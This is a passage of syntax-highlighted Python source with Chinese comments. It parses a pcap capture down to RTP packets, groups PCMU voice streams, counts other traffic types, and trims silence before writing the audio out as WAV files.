</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="n">pcm_f</span> <span class="o">*</span> <span class="n">gain</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">clip</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="o">-</span><span class="mf">32767.0</span><span class="p">,</span> <span class="mf">32767.0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">int16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_rms_dbfs</span><span class="p">(</span><span class="n">x</span><span class="p">:</span> <span class="n">np</span><span class="o">.</span><span class="n">ndarray</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">float</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="n">size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="k">return</span> <span class="o">-</span><span class="mf">120.0</span>
</span></span><span class="line"><span class="cl">    <span class="n">x_f</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float32</span><span class="p">)</span> <span class="o">/</span> <span class="mf">32768.0</span>
</span></span><span class="line"><span class="cl">    <span class="n">rms</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">x_f</span> <span class="o">*</span> <span class="n">x_f</span><span class="p">)</span> <span class="o">+</span> <span class="mf">1e-12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mf">20.0</span> <span class="o">*</span> <span class="n">np</span><span class="o">.</span><span class="n">log10</span><span class="p">(</span><span class="n">rms</span> <span class="o">+</span> <span class="mf">1e-12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remove_silence</span><span class="p">(</span><span class="n">pcm</span><span class="p">:</span> <span class="n">np</span><span class="o">.</span><span class="n">ndarray</span><span class="p">,</span> <span class="n">sr</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">SAMPLE_RATE</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">np</span><span class="o">.</span><span class="n">ndarray</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;能量门限 VAD + 滞后 + 前后包络&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pcm</span><span class="o">.</span><span class="n">size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">pcm</span>
</span></span><span class="line"><span class="cl">    <span class="n">frame_len</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">sr</span> <span class="o">*</span> <span class="n">FRAME_MS</span> <span class="o">/</span> <span class="mf">1000.0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">hop_len</span>   <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">sr</span> <span class="o">*</span> <span class="n">HOP_MS</span>   <span class="o">/</span> <span class="mf">1000.0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">frames_db</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">pcm</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">seg</span> <span class="o">=</span> <span class="n">pcm</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">frame_len</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">frames_db</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">_rms_dbfs</span><span class="p">(</span><span class="n">seg</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">+=</span> <span class="n">hop_len</span>
</span></span><span class="line"><span class="cl">    <span class="n">frames_db</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">asarray</span><span class="p">(</span><span class="n">frames_db</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">float32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">thr_on</span>  <span class="o">=</span> <span class="n">SILENCE_THRESHOLD_DBFS</span> <span class="o">+</span> <span class="n">HYSTERESIS_DB</span>
</span></span><span class="line"><span class="cl">    <span class="n">thr_off</span> <span class="o">=</span> <span class="n">SILENCE_THRESHOLD_DBFS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">voiced</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros_like</span><span class="p">(</span><span class="n">frames_db</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">bool</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">db</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">frames_db</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">state</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">db</span> <span class="o">&gt;=</span> <span class="n">thr_on</span><span class="p">:</span> <span class="n">state</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">db</span> <span class="o">&lt;</span> <span class="n">thr_off</span><span class="p">:</span> <span class="n">state</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="n">voiced</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">state</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 取语音区段</span>
</span></span><span class="line"><span class="cl">    <span class="n">intervals</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">k</span> <span class="o">=</span> <span class="p">[],</span> <span class="nb">len</span><span class="p">(</span><span class="n">voiced</span><span class="p">),</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">voiced</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="n">j</span> <span class="o">=</span> <span class="n">k</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="ow">and</span> <span class="n">voiced</span><span class="p">[</span><span class="n">j</span><span class="p">]:</span> <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="n">start</span> <span class="o">=</span> <span class="n">k</span> <span class="o">*</span> <span class="n">hop_len</span>
</span></span><span class="line"><span class="cl">            <span class="n">end</span>   <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pcm</span><span class="p">),</span> <span class="p">(</span><span class="n">j</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">hop_len</span> <span class="o">+</span> <span class="n">frame_len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">intervals</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">k</span> <span class="o">=</span> <span class="n">j</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">k</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">intervals</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">([],</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">int16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 合并/最短/前后包络</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">ms2samp</span><span class="p">(</span><span class="n">ms</span><span class="p">):</span> <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">sr</span> <span class="o">*</span> <span class="n">ms</span> <span class="o">/</span> <span class="mf">1000.0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">min_len</span>  <span class="o">=</span> <span class="n">ms2samp</span><span class="p">(</span><span class="n">MIN_VOICE_MS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">mergegap</span> <span class="o">=</span> <span class="n">ms2samp</span><span class="p">(</span><span class="n">MERGE_GAP_MS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">lead</span>     <span class="o">=</span> <span class="n">ms2samp</span><span class="p">(</span><span class="n">LEAD_PAD_MS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">tail</span>     <span class="o">=</span> <span class="n">ms2samp</span><span class="p">(</span><span class="n">TAIL_PAD_MS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">merged</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="n">cur_s</span><span class="p">,</span> <span class="n">cur_e</span> <span class="o">=</span> <span class="n">intervals</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">s</span><span class="p">,</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">intervals</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">s</span> <span class="o">-</span> <span class="n">cur_e</span> <span class="o">&lt;=</span> <span class="n">mergegap</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">cur_e</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">cur_e</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">cur_e</span> <span class="o">-</span> <span class="n">cur_s</span> <span class="o">&gt;=</span> <span class="n">min_len</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merged</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="n">cur_s</span><span class="p">,</span> <span class="n">cur_e</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">cur_s</span><span class="p">,</span> <span class="n">cur_e</span> <span class="o">=</span> <span class="n">s</span><span class="p">,</span> <span class="n">e</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">cur_e</span> <span class="o">-</span> <span class="n">cur_s</span> <span class="o">&gt;=</span> <span class="n">min_len</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merged</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="n">cur_s</span><span class="p">,</span> <span class="n">cur_e</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">merged</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">([],</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">int16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">padded</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">s</span><span class="p">,</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">merged</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span> <span class="o">-</span> <span class="n">lead</span><span class="p">);</span> <span class="n">e</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pcm</span><span class="p">),</span> <span class="n">e</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">e</span> <span class="o">&gt;</span> <span class="n">s</span><span class="p">:</span> <span class="n">padded</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="n">s</span><span class="p">,</span> <span class="n">e</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">final_intervals</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="n">cur_s</span><span class="p">,</span> <span class="n">cur_e</span> <span class="o">=</span> <span class="n">padded</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">s</span><span class="p">,</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">padded</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">s</span> <span class="o">&lt;=</span> <span class="n">cur_e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">cur_e</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">cur_e</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">final_intervals</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="n">cur_s</span><span class="p">,</span> <span class="n">cur_e</span><span class="p">]);</span> <span class="n">cur_s</span><span class="p">,</span> <span class="n">cur_e</span> <span class="o">=</span> <span class="n">s</span><span class="p">,</span> <span class="n">e</span>
</span></span><span class="line"><span class="cl">    <span class="n">final_intervals</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="n">cur_s</span><span class="p">,</span> <span class="n">cur_e</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">parts</span> <span class="o">=</span> <span class="p">[</span><span class="n">pcm</span><span class="p">[</span><span class="n">s</span><span class="p">:</span><span class="n">e</span><span class="p">]</span> <span class="k">for</span> <span class="n">s</span><span class="p">,</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">final_intervals</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">np</span><span class="o">.</span><span class="n">concatenate</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="k">if</span> <span class="n">parts</span> <span class="k">else</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">([],</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">int16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">save_wav</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">pcm</span><span class="p">,</span> <span class="n">rate</span><span class="o">=</span><span class="n">SAMPLE_RATE</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">wave</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">wf</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">wf</span><span class="o">.</span><span class="n">setnchannels</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="n">wf</span><span class="o">.</span><span class="n">setsampwidth</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span> <span class="n">wf</span><span class="o">.</span><span class="n">setframerate</span><span class="p">(</span><span class="n">rate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">wf</span><span class="o">.</span><span class="n">writeframes</span><span class="p">(</span><span class="n">pcm</span><span class="o">.</span><span class="n">tobytes</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --------------- 报告 ---------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_report</span><span class="p">(</span><span class="n">report_lines</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">REPORT_PATH</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">report_lines</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --------------- 主流程 ---------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 报告统计</span>
</span></span><span class="line"><span class="cl">    <span class="n">non_ipv4_counts</span> <span class="o">=</span> <span class="n">Counter</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">non_udp_counts</span>  <span class="o">=</span> <span class="n">Counter</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">udp_non_rtp</span>     <span class="o">=</span> <span class="n">Counter</span><span class="p">()</span>      <span class="c1"># (srcp,dstp)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rtp_non_pcmu</span>    <span class="o">=</span> <span class="n">Counter</span><span class="p">()</span>      <span class="c1"># (srcp,dstp,ssrc,pt)</span>
</span></span><span class="line"><span class="cl">    <span class="n">examples_udp_non_rtp</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="n">total_packets</span> <span class="o">=</span> <span class="n">total_ipv4</span> <span class="o">=</span> <span class="n">total_udp</span> <span class="o">=</span> <span class="n">total_rtp</span> <span class="o">=</span> <span class="n">total_rtp_pcmu</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">raw</span> <span class="o">=</span> <span class="n">read_pcap_bytes</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">streams</span> <span class="o">=</span> <span class="p">{}</span>  <span class="c1"># key=(srcp,dstp,ssrc) -&gt; [rtp packets]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 逐包解析 + 统计</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">pkt</span> <span class="ow">in</span> <span class="n">parse_pcap_le</span><span class="p">(</span><span class="n">raw</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">total_packets</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="n">eth</span> <span class="o">=</span> <span class="n">parse_eth</span><span class="p">(</span><span class="n">pkt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">eth</span><span class="p">:</span> <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">etype</span><span class="p">,</span> <span class="n">l3</span> <span class="o">=</span> <span class="n">eth</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">etype</span> <span class="o">!=</span> <span class="mh">0x0800</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">non_ipv4_counts</span><span class="p">[</span><span class="nb">hex</span><span class="p">(</span><span class="n">etype</span><span class="p">)]</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">total_ipv4</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ip</span> <span class="o">=</span> <span class="n">parse_ipv4</span><span class="p">(</span><span class="n">l3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">ip</span><span class="p">:</span> <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">proto</span><span class="p">,</span> <span class="n">ip_payload</span> <span class="o">=</span> <span class="n">ip</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">proto</span> <span class="o">!=</span> <span class="mi">17</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">non_udp_counts</span><span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">proto</span><span class="p">)]</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">total_udp</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">udp</span> <span class="o">=</span> <span class="n">parse_udp</span><span class="p">(</span><span class="n">ip_payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">udp</span><span class="p">:</span> <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">srcp</span><span class="p">,</span> <span class="n">dstp</span><span class="p">,</span> <span class="n">udp_pl</span> <span class="o">=</span> <span class="n">udp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">rtp</span> <span class="o">=</span> <span class="n">parse_rtp</span><span class="p">(</span><span class="n">udp_pl</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">rtp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">srcp</span><span class="p">,</span> <span class="n">dstp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">udp_non_rtp</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">key</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">examples_udp_non_rtp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">prefix</span> <span class="o">=</span> <span class="n">udp_pl</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span> <span class="k">if</span> <span class="n">udp_pl</span> <span class="k">else</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="n">examples_udp_non_rtp</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">prefix</span><span class="o">.</span><span class="n">hex</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">total_rtp</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">rtp</span><span class="p">[</span><span class="s2">&#34;pt&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>  <span class="c1"># 非 PCMU</span>
</span></span><span class="line"><span class="cl">            <span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">srcp</span><span class="p">,</span> <span class="n">dstp</span><span class="p">,</span> <span class="n">rtp</span><span class="p">[</span><span class="s2">&#34;ssrc&#34;</span><span class="p">],</span> <span class="n">rtp</span><span class="p">[</span><span class="s2">&#34;pt&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">rtp_non_pcmu</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">total_rtp_pcmu</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">srcp</span><span class="p">,</span> <span class="n">dstp</span><span class="p">,</span> <span class="n">rtp</span><span class="p">[</span><span class="s2">&#34;ssrc&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">streams</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="p">[])</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">rtp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">streams</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] 没抓到 PT=0(PCMU) 的 RTP。&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># ======== 正常/重复 两路音频构建 ========</span>
</span></span><span class="line"><span class="cl">    <span class="n">out_files_main</span><span class="p">,</span> <span class="n">out_files_dup</span> <span class="o">=</span> <span class="p">[],</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="n">per_stream_main</span><span class="p">,</span> <span class="n">per_stream_dup</span> <span class="o">=</span> <span class="p">[],</span> <span class="p">[]</span>  <span class="c1"># [(key, pcm, path)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">srcp</span><span class="p">,</span> <span class="n">dstp</span><span class="p">,</span> <span class="n">ssrc</span><span class="p">),</span> <span class="n">pkts</span> <span class="ow">in</span> <span class="n">streams</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">pkts</span><span class="p">:</span> <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">pkts</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">r</span><span class="p">:</span> <span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="s2">&#34;ts&#34;</span><span class="p">],</span> <span class="n">r</span><span class="p">[</span><span class="s2">&#34;seq&#34;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># 统计常见负载长度</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">size_counts</span> <span class="o">=</span> <span class="n">Counter</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="s2">&#34;payload&#34;</span><span class="p">])</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">pkts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">default_pl_size</span> <span class="o">=</span> <span class="n">size_counts</span><span class="o">.</span><span class="n">most_common</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">default_pl_size</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">default_pl_size</span> <span class="o">=</span> <span class="n">FALLBACK_PL_SIZE</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">default_pl_size</span> <span class="o">=</span> <span class="n">FALLBACK_PL_SIZE</span>
</span></span><span class="line"><span class="cl">
